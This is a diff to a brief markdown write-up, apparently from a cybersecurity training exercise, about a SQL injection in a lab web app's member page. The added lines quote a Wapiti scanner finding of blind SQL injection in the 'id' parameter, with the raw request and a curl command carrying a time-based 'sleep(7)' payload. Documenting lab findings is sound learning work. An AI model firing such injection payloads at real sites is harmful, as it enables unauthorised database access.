@@ -1,7 +1,16 @@
 # SQL Injection Member page
 Page: http://10.13.200.53/?page=member
 
-WAPITI SCAN reveal this error
+WAPITI SCAN reveal this error:
+```
+Vulnerability found in /index.php
+Description HTTP Request cURL command line
+Blind SQL vulnerability via injection in the parameter id
+GET /index.php?page=member&id=sleep%287%29%231&Submit=Submit HTTP/1.1
+Host: 10.13.200.53
+Referer: http://10.13.200.53/index.php?page=member
+curl "http://10.13.200.53/index.php?page=member&id=sleep%287%29%231&Submit=Submit" -e "http://10.13.200.53/index.php?page=member"
+```
 Cybersecurity piscine script also
 
 ## SQL
